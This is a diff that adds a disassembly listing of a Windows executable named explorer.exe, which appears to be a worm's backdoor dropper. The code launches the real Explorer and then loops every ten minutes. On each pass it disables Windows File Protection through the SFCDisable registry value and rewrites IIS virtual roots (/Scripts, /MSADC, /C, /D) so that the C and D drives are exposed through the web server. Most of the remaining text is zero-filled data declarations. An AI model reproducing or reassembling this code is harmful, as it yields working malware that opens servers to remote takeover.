@@ -1,0 +1,2154 @@
+seg000:00401000	;
+seg000:00401000	; File Name   :	C:\work\worm\explorer.exe
+seg000:00401000	; Format      :	Portable executable for	IBM PC (PE)
+seg000:00401000	; Section 1. (virtual address 00001000)
+seg000:00401000	; Virtual size			: 00001000 (   4096.)
+seg000:00401000	; Section size in file		: 00000400 (   1024.)
+seg000:00401000	; Offset to raw	data for section: 00000800
+seg000:00401000	; Flags	60000020: Text Executable Readable
+seg000:00401000	; Alignment	: 16 bytes ?
+seg000:00401000	
+seg000:00401000			model flat
+seg000:00401000	
+seg000:00401000	; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
+seg000:00401000	
+seg000:00401000	seg000		segment	para public 'CODE' use32
+seg000:00401000			assume cs:seg000
+seg000:00401000			;org 401000h
+seg000:00401000			assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
+seg000:00401000	
+seg000:00401000	; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
+seg000:00401000	
+seg000:00401000	
+seg000:00401000			public start
+seg000:00401000	start		proc near
+seg000:00401000			push	104h		; uSize
+seg000:00401005			push	offset LPBuffer	; lpBuffer
+seg000:0040100A			call	GetWindowsDirectoryA
+seg000:0040100F			lea	edi, LPBuffer[eax]
+seg000:00401015			mov	esi, offset aExplorer_exe ; "\\EXPLORER.EXE"
+seg000:0040101A			movsd
+seg000:0040101B			movsd
+seg000:0040101C			movsd
+seg000:0040101D			movsd			; set eax to WINDIR\explorer.exe
+seg000:0040101E			push	1		; uCmdShow
+seg000:00401020			push	offset LPBuffer	; lpCmdLine
+seg000:00401025			call	WinExec
+seg000:0040102A	
+seg000:0040102A	REG_LOOP:				; CODE XREF: start+39j
+seg000:0040102A			call	DO_REG_SET
+seg000:0040102F			push	927C0h		; dwMilliseconds
+seg000:00401034			call	Sleep		; sleep	for a bit
+seg000:00401039			jmp	short REG_LOOP
+seg000:00401039	start		endp
+seg000:00401039	
+seg000:0040103B	
+seg000:0040103B	; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
+seg000:0040103B	
+seg000:0040103B	
+seg000:0040103B	DO_REG_SET	proc near		; CODE XREF: start+2Ap
+seg000:0040103B			push	offset hKey	; phkResult
+seg000:00401040			push	0F003Fh		; samDesired
+seg000:00401045			push	0		; ulOptions
+seg000:00401047			push	offset aSoftwareMicros ; lpSubKey
+seg000:0040104C			push	80000002h	; hKey
+seg000:00401051			call	RegOpenKeyExA	; open winlogon	key
+seg000:00401056			or	eax, eax
+seg000:00401058			jnz	short DO_VROOT_REGSET
+seg000:0040105A			push	4		; cbData
+seg000:0040105C			push	offset PERMANENT_SFCDISABLE ; lpData
+seg000:00401061			push	4		; dwType
+seg000:00401063			push	0		; Reserved
+seg000:00401065			push	offset aSfcdisable ; lpValueName
+seg000:0040106A			push	ds:hKey		; hKey
+seg000:00401070			call	RegSetValueExA	; set SFCDisable to permanently	off
+seg000:00401075			push	ds:hKey		; hKey
+seg000:0040107B			call	RegCloseKey
+seg000:00401080	
+seg000:00401080	DO_VROOT_REGSET:			; CODE XREF: DO_REG_SET+1Dj
+seg000:00401080			push	offset hKey	; phkResult
+seg000:00401085			push	0F003Fh		; samDesired
+seg000:0040108A			push	0		; ulOptions
+seg000:0040108C			push	offset aSystemCurrentc ; lpSubKey
+seg000:00401091			push	80000002h	; hKey
+seg000:00401096			call	RegOpenKeyExA	; open w3svc Virtual Roots key
+seg000:0040109B			or	eax, eax
+seg000:0040109D			jnz	short EXIT_REGSET
+seg000:0040109F			mov	ebp, offset aScripts ; "/Scripts"
+seg000:004010A4			call	VROOT_217	; Set the scripts root to 217
+seg000:004010A9			mov	ebp, offset aMsadc ; "/MSADC"
+seg000:004010AE			call	VROOT_217	;  set the msadc root to 217
+seg000:004010B3			push	9		; cbData
+seg000:004010B5			push	offset aC217	; lpData
+seg000:004010BA			push	1		; dwType
+seg000:004010BC			push	0		; Reserved
+seg000:004010BE			push	offset aC	; lpValueName
+seg000:004010C3			push	ds:hKey		; hKey
+seg000:004010C9			call	RegSetValueExA	; set the /c root to 217
+seg000:004010CE			push	9		; cbData
+seg000:004010D0			push	offset aD217	; lpData
+seg000:004010D5			push	1		; dwType
+seg000:004010D7			push	0		; Reserved
+seg000:004010D9			push	offset aD	; lpValueName
+seg000:004010DE			push	ds:hKey		; hKey
+seg000:004010E4			call	RegSetValueExA	; set the /d root to 217
+seg000:004010E9			push	ds:hKey		; hKey
+seg000:004010EF			call	RegCloseKey
+seg000:004010F4	
+seg000:004010F4	EXIT_REGSET:				; CODE XREF: DO_REG_SET+62j
+seg000:004010F4			retn
+seg000:004010F4	DO_REG_SET	endp
+seg000:004010F4	
+seg000:004010F5	
+seg000:004010F5	; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
+seg000:004010F5	
+seg000:004010F5	
+seg000:004010F5	VROOT_217	proc near		; CODE XREF: DO_REG_SET+69p
+seg000:004010F5						; DO_REG_SET+73p
+seg000:004010F5			mov	ds:cbData, 400h
+seg000:004010FF			push	offset cbData	; lpcbData
+seg000:00401104			push	offset LPBuffer	; lpData
+seg000:00401109			push	offset unk_4024D4 ; lpType
+seg000:0040110E			push	0		; lpReserved
+seg000:00401110			push	ebp		; lpValueName
+seg000:00401111			push	ds:hKey		; hKey
+seg000:00401117			call	RegQueryValueExA
+seg000:0040111C			or	eax, eax
+seg000:0040111E			jnz	short locret_401169
+seg000:00401120			mov	eax, ds:cbData
+seg000:00401125			or	eax, eax
+seg000:00401127			jz	short locret_401169
+seg000:00401129			mov	esi, offset LPBuffer
+seg000:0040112E	
+seg000:0040112E	loc_40112E:				; CODE XREF: VROOT_217+45j
+seg000:0040112E			cmp	byte ptr [esi],	0
+seg000:00401131			jz	short locret_401169
+seg000:00401133			inc	esi
+seg000:00401134			cmp	word ptr [esi-2], ',,'
+seg000:0040113A			jnz	short loc_40112E
+seg000:0040113C			mov	dword ptr [esi], '712'
+seg000:00401142			sub	esi, 4020CCh
+seg000:00401148			mov	ds:cbData, esi
+seg000:0040114E			push	ds:cbData	; cbData
+seg000:00401154			push	offset LPBuffer	; lpData
+seg000:00401159			push	1		; dwType
+seg000:0040115B			push	0		; Reserved
+seg000:0040115D			push	ebp		; lpValueName
+seg000:0040115E			push	ds:hKey		; hKey
+seg000:00401164			call	RegSetValueExA	; set to 712
+seg000:00401169	
+seg000:00401169	locret_401169:				; CODE XREF: VROOT_217+29j
+seg000:00401169						; VROOT_217+32j ...
+seg000:00401169			retn
+seg000:00401169	VROOT_217	endp
+seg000:00401169	
+seg000:0040116A	; [00000006 BYTES: COLLAPSED FUNCTION Sleep. PRESS KEYPAD "+" TO EXPAND]
+seg000:00401170	; [00000006 BYTES: COLLAPSED FUNCTION GetWindowsDirectoryA. PRESS KEYPAD "+" TO	EXPAND]
+seg000:00401176	; [00000006 BYTES: COLLAPSED FUNCTION WinExec. PRESS KEYPAD "+"	TO EXPAND]
+seg000:0040117C	; [00000006 BYTES: COLLAPSED FUNCTION RegQueryValueExA.	PRESS KEYPAD "+" TO EXPAND]
+seg000:00401182	; [00000006 BYTES: COLLAPSED FUNCTION RegSetValueExA. PRESS KEYPAD "+" TO EXPAND]
+seg000:00401188	; [00000006 BYTES: COLLAPSED FUNCTION RegOpenKeyExA. PRESS KEYPAD "+" TO EXPAND]
+seg000:0040118E	; [00000006 BYTES: COLLAPSED FUNCTION RegCloseKey. PRESS KEYPAD	"+" TO EXPAND]
+seg000:00401194			dd 9Bh dup(0)
+seg000:00401400			dd 300h	dup(?)
+seg000:00401400	seg000		ends
+seg000:00401400	
+seg001:00402000	; Section 2. (virtual address 00002000)
+seg001:00402000	; Virtual size			: 00001000 (   4096.)
+seg001:00402000	; Section size in file		: 00000400 (   1024.)
+seg001:00402000	; Offset to raw	data for section: 00000C00
+seg001:00402000	; Flags	C0000040: Data Readable	Writable
+seg001:00402000	; Alignment	: 16 bytes ?
+seg001:00402000	; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
+seg001:00402000	
+seg001:00402000	seg001		segment	para public 'DATA' use32
+seg001:00402000			assume cs:seg001
+seg001:00402000			;org 402000h
+seg001:00402000	aExplorer_exe	db '\EXPLORER.EXE',0    ; DATA XREF: start+15o
+seg001:0040200E			align 4
+seg001:00402010	aSoftwareMicros	db 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',0
+seg001:00402010						; DATA XREF: DO_REG_SET+Co
+seg001:00402046			align 4
+seg001:00402048	aSfcdisable	db 'SFCDisable',0       ; DATA XREF: DO_REG_SET+2Ao
+seg001:00402053			align 4
+seg001:00402054	PERMANENT_SFCDISABLE dd	0FFFFFF9Dh	; DATA XREF: DO_REG_SET+21o
+seg001:00402058	aSystemCurrentc	db 'SYSTEM\CurrentControlSet\Services\W3SVC\Parameters\Virtual R'
+seg001:00402058						; DATA XREF: DO_REG_SET+51o
+seg001:00402058			db 'oots',0
+seg001:00402099			align 4
+seg001:0040209C	aScripts	db '/Scripts',0         ; DATA XREF: DO_REG_SET+64o
+seg001:004020A5			align 4
+seg001:004020A8	aMsadc		db '/MSADC',0           ; DATA XREF: DO_REG_SET+6Eo
+seg001:004020AF			align 4
+seg001:004020B0	aC		db '/C',0               ; DATA XREF: DO_REG_SET+83o
+seg001:004020B3			align 4
+seg001:004020B4	aD		db '/D',0               ; DATA XREF: DO_REG_SET+9Eo
+seg001:004020B7			align 4
+seg001:004020B8	aC217		db 'c:\,,217',0         ; DATA XREF: DO_REG_SET+7Ao
+seg001:004020C1			align 4
+seg001:004020C4	aD217		db 'd:\,,217',0         ; DATA XREF: DO_REG_SET+95o
+seg001:004020CD			align 4
+seg001:004020D0	LPBuffer	db    0	;		; DATA XREF: start+5o
+seg001:004020D0						; start+Fr ...
+seg001:004020D1			db    0	;  
+seg001:004020D2			db    0	;  
+seg001:004020D3			db    0	;  
+seg001:004020D4			db    0	;  
+seg001:004020D5			db    0	;  
+seg001:004020D6			db    0	;  
+seg001:004020D7			db    0	;  
+seg001:004020D8			db    0	;  
+seg001:004020D9			db    0	;  
+seg001:004020DA			db    0	;  
+seg001:004020DB			db    0	;  
+seg001:004020DC			db    0	;  
+seg001:004020DD			db    0	;  
+seg001:004020DE			db    0	;  
+seg001:004020DF			db    0	;  
+seg001:004020E0			db    0	;  
+seg001:004020E1			db    0	;  
+seg001:004020E2			db    0	;  
+seg001:004020E3			db    0	;  
+seg001:004020E4			db    0	;  
+seg001:004020E5			db    0	;  
+seg001:004020E6			db    0	;  
+seg001:004020E7			db    0	;  
+seg001:004020E8			db    0	;  
+seg001:004020E9			db    0	;  
+seg001:004020EA			db    0	;  
+seg001:004020EB			db    0	;  
+seg001:004020EC			db    0	;  
+seg001:004020ED			db    0	;  
+seg001:004020EE			db    0	;  
+seg001:004020EF			db    0	;  
+seg001:004020F0			db    0	;  
+seg001:004020F1			db    0	;  
+seg001:004020F2			db    0	;  
+seg001:004020F3			db    0	;  
+seg001:004020F4			db    0	;  
+seg001:004020F5			db    0	;  
+seg001:004020F6			db    0	;  
+seg001:004020F7			db    0	;  
+seg001:004020F8			db    0	;  
+seg001:004020F9			db    0	;  
+seg001:004020FA			db    0	;  
+seg001:004020FB			db    0	;  
+seg001:004020FC			db    0	;  
+seg001:004020FD			db    0	;  
+seg001:004020FE			db    0	;  
+seg001:004020FF			db    0	;  
+seg001:00402100			db    0	;  
+seg001:00402101			db    0	;  
+seg001:00402102			db    0	;  
+seg001:00402103			db    0	;  
+seg001:00402104			db    0	;  
+seg001:00402105			db    0	;  
+seg001:00402106			db    0	;  
+seg001:00402107			db    0	;  
+seg001:00402108			db    0	;  
+seg001:00402109			db    0	;  
+seg001:0040210A			db    0	;  
+seg001:0040210B			db    0	;  
+seg001:0040210C			db    0	;  
+seg001:0040210D			db    0	;  
+seg001:0040210E			db    0	;  
+seg001:0040210F			db    0	;  
+seg001:00402110			db    0	;  
+seg001:00402111			db    0	;  
+seg001:00402112			db    0	;  
+seg001:00402113			db    0	;  
+seg001:00402114			db    0	;  
+seg001:00402115			db    0	;  
+seg001:00402116			db    0	;  
+seg001:00402117			db    0	;  
+seg001:00402118			db    0	;  
+seg001:00402119			db    0	;  
+seg001:0040211A			db    0	;  
+seg001:0040211B			db    0	;  
+seg001:0040211C			db    0	;  
+seg001:0040211D			db    0	;  
+seg001:0040211E			db    0	;  
+seg001:0040211F			db    0	;  
+seg001:00402120			db    0	;  
+seg001:00402121			db    0	;  
+seg001:00402122			db    0	;  
+seg001:00402123			db    0	;  
+seg001:00402124			db    0	;  
+seg001:00402125			db    0	;  
+seg001:00402126			db    0	;  
+seg001:00402127			db    0	;  
+seg001:00402128			db    0	;  
+seg001:00402129			db    0	;  
+seg001:0040212A			db    0	;  
+seg001:0040212B			db    0	;  
+seg001:0040212C			db    0	;  
+seg001:0040212D			db    0	;  
+seg001:0040212E			db    0	;  
+seg001:0040212F			db    0	;  
+seg001:00402130			db    0	;  
+seg001:00402131			db    0	;  
+seg001:00402132			db    0	;  
+seg001:00402133			db    0	;  
+seg001:00402134			db    0	;  
+seg001:00402135			db    0	;  
+seg001:00402136			db    0	;  
+seg001:00402137			db    0	;  
+seg001:00402138			db    0	;  
+seg001:00402139			db    0	;  
+seg001:0040213A			db    0	;  
+seg001:0040213B			db    0	;  
+seg001:0040213C			db    0	;  
+seg001:0040213D			db    0	;  
+seg001:0040213E			db    0	;  
+seg001:0040213F			db    0	;  
+seg001:00402140			db    0	;  
+seg001:00402141			db    0	;  
+seg001:00402142			db    0	;  
+seg001:00402143			db    0	;  
+seg001:00402144			db    0	;  
+seg001:00402145			db    0	;  
+seg001:00402146			db    0	;  
+seg001:00402147			db    0	;  
+seg001:00402148			db    0	;  
+seg001:00402149			db    0	;  
+seg001:0040214A			db    0	;  
+seg001:0040214B			db    0	;  
+seg001:0040214C			db    0	;  
+seg001:0040214D			db    0	;  
+seg001:0040214E			db    0	;  
+seg001:0040214F			db    0	;  
+seg001:00402150			db    0	;  
+seg001:00402151			db    0	;  
+seg001:00402152			db    0	;  
+seg001:00402153			db    0	;  
+seg001:00402154			db    0	;  
+seg001:00402155			db    0	;  
+seg001:00402156			db    0	;  
+seg001:00402157			db    0	;  
+seg001:00402158			db    0	;  
+seg001:00402159			db    0	;  
+seg001:0040215A			db    0	;  
+seg001:0040215B			db    0	;  
+seg001:0040215C			db    0	;  
+seg001:0040215D			db    0	;  
+seg001:0040215E			db    0	;  
+seg001:0040215F			db    0	;  
+seg001:00402160			db    0	;  
+seg001:00402161			db    0	;  
+seg001:00402162			db    0	;  
+seg001:00402163			db    0	;  
+seg001:00402164			db    0	;  
+seg001:00402165			db    0	;  
+seg001:00402166			db    0	;  
+seg001:00402167			db    0	;  
+seg001:00402168			db    0	;  
+seg001:00402169			db    0	;  
+seg001:0040216A			db    0	;  
+seg001:0040216B			db    0	;  
+seg001:0040216C			db    0	;  
+seg001:0040216D			db    0	;  
+seg001:0040216E			db    0	;  
+seg001:0040216F			db    0	;  
+seg001:00402170			db    0	;  
+seg001:00402171			db    0	;  
+seg001:00402172			db    0	;  
+seg001:00402173			db    0	;  
+seg001:00402174			db    0	;  
+seg001:00402175			db    0	;  
+seg001:00402176			db    0	;  
+seg001:00402177			db    0	;  
+seg001:00402178			db    0	;  
+seg001:00402179			db    0	;  
+seg001:0040217A			db    0	;  
+seg001:0040217B			db    0	;  
+seg001:0040217C			db    0	;  
+seg001:0040217D			db    0	;  
+seg001:0040217E			db    0	;  
+seg001:0040217F			db    0	;  
+seg001:00402180			db    0	;  
+seg001:00402181			db    0	;  
+seg001:00402182			db    0	;  
+seg001:00402183			db    0	;  
+seg001:00402184			db    0	;  
+seg001:00402185			db    0	;  
+seg001:00402186			db    0	;  
+seg001:00402187			db    0	;  
+seg001:00402188			db    0	;  
+seg001:00402189			db    0	;  
+seg001:0040218A			db    0	;  
+seg001:0040218B			db    0	;  
+seg001:0040218C			db    0	;  
+seg001:0040218D			db    0	;  
+seg001:0040218E			db    0	;  
+seg001:0040218F			db    0	;  
+seg001:00402190			db    0	;  
+seg001:00402191			db    0	;  
+seg001:00402192			db    0	;  
+seg001:00402193			db    0	;  
+seg001:00402194			db    0	;  
+seg001:00402195			db    0	;  
+seg001:00402196			db    0	;  
+seg001:00402197			db    0	;  
+seg001:00402198			db    0	;  
+seg001:00402199			db    0	;  
+seg001:0040219A			db    0	;  
+seg001:0040219B			db    0	;  
+seg001:0040219C			db    0	;  
+seg001:0040219D			db    0	;  
+seg001:0040219E			db    0	;  
+seg001:0040219F			db    0	;  
+seg001:004021A0			db    0	;  
+seg001:004021A1			db    0	;  
+seg001:004021A2			db    0	;  
+seg001:004021A3			db    0	;  
+seg001:004021A4			db    0	;  
+seg001:004021A5			db    0	;  
+seg001:004021A6			db    0	;  
+seg001:004021A7			db    0	;  
+seg001:004021A8			db    0	;  
+seg001:004021A9			db    0	;  
+seg001:004021AA			db    0	;  
+seg001:004021AB			db    0	;  
+seg001:004021AC			db    0	;  
+seg001:004021AD			db    0	;  
+seg001:004021AE			db    0	;  
+seg001:004021AF			db    0	;  
+seg001:004021B0			db    0	;  
+seg001:004021B1			db    0	;  
+seg001:004021B2			db    0	;  
+seg001:004021B3			db    0	;  
+seg001:004021B4			db    0	;  
+seg001:004021B5			db    0	;  
+seg001:004021B6			db    0	;  
+seg001:004021B7			db    0	;  
+seg001:004021B8			db    0	;  
+seg001:004021B9			db    0	;  
+seg001:004021BA			db    0	;  
+seg001:004021BB			db    0	;  
+seg001:004021BC			db    0	;  
+seg001:004021BD			db    0	;  
+seg001:004021BE			db    0	;  
+seg001:004021BF			db    0	;  
+seg001:004021C0			db    0	;  
+seg001:004021C1			db    0	;  
+seg001:004021C2			db    0	;  
+seg001:004021C3			db    0	;  
+seg001:004021C4			db    0	;  
+seg001:004021C5			db    0	;  
+seg001:004021C6			db    0	;  
+seg001:004021C7			db    0	;  
+seg001:004021C8			db    0	;  
+seg001:004021C9			db    0	;  
+seg001:004021CA			db    0	;  
+seg001:004021CB			db    0	;  
+seg001:004021CC			db    0	;  
+seg001:004021CD			db    0	;  
+seg001:004021CE			db    0	;  
+seg001:004021CF			db    0	;  
+seg001:004021D0			db    0	;  
+seg001:004021D1			db    0	;  
+seg001:004021D2			db    0	;  
+seg001:004021D3			db    0	;  
+seg001:004021D4			db    0	;  
+seg001:004021D5			db    0	;  
+seg001:004021D6			db    0	;  
+seg001:004021D7			db    0	;  
+seg001:004021D8			db    0	;  
+seg001:004021D9			db    0	;  
+seg001:004021DA			db    0	;  
+seg001:004021DB			db    0	;  
+seg001:004021DC			db    0	;  
+seg001:004021DD			db    0	;  
+seg001:004021DE			db    0	;  
+seg001:004021DF			db    0	;  
+seg001:004021E0			db    0	;  
+seg001:004021E1			db    0	;  
+seg001:004021E2			db    0	;  
+seg001:004021E3			db    0	;  
+seg001:004021E4			db    0	;  
+seg001:004021E5			db    0	;  
+seg001:004021E6			db    0	;  
+seg001:004021E7			db    0	;  
+seg001:004021E8			db    0	;  
+seg001:004021E9			db    0	;  
+seg001:004021EA			db    0	;  
+seg001:004021EB			db    0	;  
+seg001:004021EC			db    0	;  
+seg001:004021ED			db    0	;  
+seg001:004021EE			db    0	;  
+seg001:004021EF			db    0	;  
+seg001:004021F0			db    0	;  
+seg001:004021F1			db    0	;  
+seg001:004021F2			db    0	;  
+seg001:004021F3			db    0	;  
+seg001:004021F4			db    0	;  
+seg001:004021F5			db    0	;  
+seg001:004021F6			db    0	;  
+seg001:004021F7			db    0	;  
+seg001:004021F8			db    0	;  
+seg001:004021F9			db    0	;  
+seg001:004021FA			db    0	;  
+seg001:004021FB			db    0	;  
+seg001:004021FC			db    0	;  
+seg001:004021FD			db    0	;  
+seg001:004021FE			db    0	;  
+seg001:004021FF			db    0	;  
+seg001:00402200			db    0	;  
+seg001:00402201			db    0	;  
+seg001:00402202			db    0	;  
+seg001:00402203			db    0	;  
+seg001:00402204			db    0	;  
+seg001:00402205			db    0	;  
+seg001:00402206			db    0	;  
+seg001:00402207			db    0	;  
+seg001:00402208			db    0	;  
+seg001:00402209			db    0	;  
+seg001:0040220A			db    0	;  
+seg001:0040220B			db    0	;  
+seg001:0040220C			db    0	;  
+seg001:0040220D			db    0	;  
+seg001:0040220E			db    0	;  
+seg001:0040220F			db    0	;  
+seg001:00402210			db    0	;  
+seg001:00402211			db    0	;  
+seg001:00402212			db    0	;  
+seg001:00402213			db    0	;  
+seg001:00402214			db    0	;  
+seg001:00402215			db    0	;  
+seg001:00402216			db    0	;  
+seg001:00402217			db    0	;  
+seg001:00402218			db    0	;  
+seg001:00402219			db    0	;  
+seg001:0040221A			db    0	;  
+seg001:0040221B			db    0	;  
+seg001:0040221C			db    0	;  
+seg001:0040221D			db    0	;  
+seg001:0040221E			db    0	;  
+seg001:0040221F			db    0	;  
+seg001:00402220			db    0	;  
+seg001:00402221			db    0	;  
+seg001:00402222			db    0	;  
+seg001:00402223			db    0	;  
+seg001:00402224			db    0	;  
+seg001:00402225			db    0	;  
+seg001:00402226			db    0	;  
+seg001:00402227			db    0	;  
+seg001:00402228			db    0	;  
+seg001:00402229			db    0	;  
+seg001:0040222A			db    0	;  
+seg001:0040222B			db    0	;  
+seg001:0040222C			db    0	;  
+seg001:0040222D			db    0	;  
+seg001:0040222E			db    0	;  
+seg001:0040222F			db    0	;  
+seg001:00402230			db    0	;  
+seg001:00402231			db    0	;  
+seg001:00402232			db    0	;  
+seg001:00402233			db    0	;  
+seg001:00402234			db    0	;  
+seg001:00402235			db    0	;  
+seg001:00402236			db    0	;  
+seg001:00402237			db    0	;  
+seg001:00402238			db    0	;  
+seg001:00402239			db    0	;  
+seg001:0040223A			db    0	;  
+seg001:0040223B			db    0	;  
+seg001:0040223C			db    0	;  
+seg001:0040223D			db    0	;  
+seg001:0040223E			db    0	;  
+seg001:0040223F			db    0	;  
+seg001:00402240			db    0	;  
+seg001:00402241			db    0	;  
+seg001:00402242			db    0	;  
+seg001:00402243			db    0	;  
+seg001:00402244			db    0	;  
+seg001:00402245			db    0	;  
+seg001:00402246			db    0	;  
+seg001:00402247			db    0	;  
+seg001:00402248			db    0	;  
+seg001:00402249			db    0	;  
+seg001:0040224A			db    0	;  
+seg001:0040224B			db    0	;  
+seg001:0040224C			db    0	;  
+seg001:0040224D			db    0	;  
+seg001:0040224E			db    0	;  
+seg001:0040224F			db    0	;  
+seg001:00402250			db    0	;  
+seg001:00402251			db    0	;  
+seg001:00402252			db    0	;  
+seg001:00402253			db    0	;  
+seg001:00402254			db    0	;  
+seg001:00402255			db    0	;  
+seg001:00402256			db    0	;  
+seg001:00402257			db    0	;  
+seg001:00402258			db    0	;  
+seg001:00402259			db    0	;  
+seg001:0040225A			db    0	;  
+seg001:0040225B			db    0	;  
+seg001:0040225C			db    0	;  
+seg001:0040225D			db    0	;  
+seg001:0040225E			db    0	;  
+seg001:0040225F			db    0	;  
+seg001:00402260			db    0	;  
+seg001:00402261			db    0	;  
+seg001:00402262			db    0	;  
+seg001:00402263			db    0	;  
+seg001:00402264			db    0	;  
+seg001:00402265			db    0	;  
+seg001:00402266			db    0	;  
+seg001:00402267			db    0	;  
+seg001:00402268			db    0	;  
+seg001:00402269			db    0	;  
+seg001:0040226A			db    0	;  
+seg001:0040226B			db    0	;  
+seg001:0040226C			db    0	;  
+seg001:0040226D			db    0	;  
+seg001:0040226E			db    0	;  
+seg001:0040226F			db    0	;  
+seg001:00402270			db    0	;  
+seg001:00402271			db    0	;  
+seg001:00402272			db    0	;  
+seg001:00402273			db    0	;  
+seg001:00402274			db    0	;  
+seg001:00402275			db    0	;  
+seg001:00402276			db    0	;  
+seg001:00402277			db    0	;  
+seg001:00402278			db    0	;  
+seg001:00402279			db    0	;  
+seg001:0040227A			db    0	;  
+seg001:0040227B			db    0	;  
+seg001:0040227C			db    0	;  
+seg001:0040227D			db    0	;  
+seg001:0040227E			db    0	;  
+seg001:0040227F			db    0	;  
+seg001:00402280			db    0	;  
+seg001:00402281			db    0	;  
+seg001:00402282			db    0	;  
+seg001:00402283			db    0	;  
+seg001:00402284			db    0	;  
+seg001:00402285			db    0	;  
+seg001:00402286			db    0	;  
+seg001:00402287			db    0	;  
+seg001:00402288			db    0	;  
+seg001:00402289			db    0	;  
+seg001:0040228A			db    0	;  
+seg001:0040228B			db    0	;  
+seg001:0040228C			db    0	;  
+seg001:0040228D			db    0	;  
+seg001:0040228E			db    0	;  
+seg001:0040228F			db    0	;  
+seg001:00402290			db    0	;  
+seg001:00402291			db    0	;  
+seg001:00402292			db    0	;  
+seg001:00402293			db    0	;  
+seg001:00402294			db    0	;  
+seg001:00402295			db    0	;  
+seg001:00402296			db    0	;  
+seg001:00402297			db    0	;  
+seg001:00402298			db    0	;  
+seg001:00402299			db    0	;  
+seg001:0040229A			db    0	;  
+seg001:0040229B			db    0	;  
+seg001:0040229C			db    0	;  
+seg001:0040229D			db    0	;  
+seg001:0040229E			db    0	;  
+seg001:0040229F			db    0	;  
+seg001:004022A0			db    0	;  
+seg001:004022A1			db    0	;  
+seg001:004022A2			db    0	;  
+seg001:004022A3			db    0	;  
+seg001:004022A4			db    0	;  
+seg001:004022A5			db    0	;  
+seg001:004022A6			db    0	;  
+seg001:004022A7			db    0	;  
+seg001:004022A8			db    0	;  
+seg001:004022A9			db    0	;  
+seg001:004022AA			db    0	;  
+seg001:004022AB			db    0	;  
+seg001:004022AC			db    0	;  
+seg001:004022AD			db    0	;  
+seg001:004022AE			db    0	;  
+seg001:004022AF			db    0	;  
+seg001:004022B0			db    0	;  
+seg001:004022B1			db    0	;  
+seg001:004022B2			db    0	;  
+seg001:004022B3			db    0	;  
+seg001:004022B4			db    0	;  
+seg001:004022B5			db    0	;  
+seg001:004022B6			db    0	;  
+seg001:004022B7			db    0	;  
+seg001:004022B8			db    0	;  
+seg001:004022B9			db    0	;  
+seg001:004022BA			db    0	;  
+seg001:004022BB			db    0	;  
+seg001:004022BC			db    0	;  
+seg001:004022BD			db    0	;  
+seg001:004022BE			db    0	;  
+seg001:004022BF			db    0	;  
+seg001:004022C0			db    0	;  
+seg001:004022C1			db    0	;  
+seg001:004022C2			db    0	;  
+seg001:004022C3			db    0	;  
+seg001:004022C4			db    0	;  
+seg001:004022C5			db    0	;  
+seg001:004022C6			db    0	;  
+seg001:004022C7			db    0	;  
+seg001:004022C8			db    0	;  
+seg001:004022C9			db    0	;  
+seg001:004022CA			db    0	;  
+seg001:004022CB			db    0	;  
+seg001:004022CC			db    0	;  
+seg001:004022CD			db    0	;  
+seg001:004022CE			db    0	;  
+seg001:004022CF			db    0	;  
+seg001:004022D0			db    0	;  
+seg001:004022D1			db    0	;  
+seg001:004022D2			db    0	;  
+seg001:004022D3			db    0	;  
+seg001:004022D4			db    0	;  
+seg001:004022D5			db    0	;  
+seg001:004022D6			db    0	;  
+seg001:004022D7			db    0	;  
+seg001:004022D8			db    0	;  
+seg001:004022D9			db    0	;  
+seg001:004022DA			db    0	;  
+seg001:004022DB			db    0	;  
+seg001:004022DC			db    0	;  
+seg001:004022DD			db    0	;  
+seg001:004022DE			db    0	;  
+seg001:004022DF			db    0	;  
+seg001:004022E0			db    0	;  
+seg001:004022E1			db    0	;  
+seg001:004022E2			db    0	;  
+seg001:004022E3			db    0	;  
+seg001:004022E4			db    0	;  
+seg001:004022E5			db    0	;  
+seg001:004022E6			db    0	;  
+seg001:004022E7			db    0	;  
+seg001:004022E8			db    0	;  
+seg001:004022E9			db    0	;  
+seg001:004022EA			db    0	;  
+seg001:004022EB			db    0	;  
+seg001:004022EC			db    0	;  
+seg001:004022ED			db    0	;  
+seg001:004022EE			db    0	;  
+seg001:004022EF			db    0	;  
+seg001:004022F0			db    0	;  
+seg001:004022F1			db    0	;  
+seg001:004022F2			db    0	;  
+seg001:004022F3			db    0	;  
+seg001:004022F4			db    0	;  
+seg001:004022F5			db    0	;  
+seg001:004022F6			db    0	;  
+seg001:004022F7			db    0	;  
+seg001:004022F8			db    0	;  
+seg001:004022F9			db    0	;  
+seg001:004022FA			db    0	;  
+seg001:004022FB			db    0	;  
+seg001:004022FC			db    0	;  
+seg001:004022FD			db    0	;  
+seg001:004022FE			db    0	;  
+seg001:004022FF			db    0	;  
+seg001:00402300			db    0	;  
+seg001:00402301			db    0	;  
+seg001:00402302			db    0	;  
+seg001:00402303			db    0	;  
+seg001:00402304			db    0	;  
+seg001:00402305			db    0	;  
+seg001:00402306			db    0	;  
+seg001:00402307			db    0	;  
+seg001:00402308			db    0	;  
+seg001:00402309			db    0	;  
+seg001:0040230A			db    0	;  
+seg001:0040230B			db    0	;  
+seg001:0040230C			db    0	;  
+seg001:0040230D			db    0	;  
+seg001:0040230E			db    0	;  
+seg001:0040230F			db    0	;  
+seg001:00402310			db    0	;  
+seg001:00402311			db    0	;  
+seg001:00402312			db    0	;  
+seg001:00402313			db    0	;  
+seg001:00402314			db    0	;  
+seg001:00402315			db    0	;  
+seg001:00402316			db    0	;  
+seg001:00402317			db    0	;  
+seg001:00402318			db    0	;  
+seg001:00402319			db    0	;  
+seg001:0040231A			db    0	;  
+seg001:0040231B			db    0	;  
+seg001:0040231C			db    0	;  
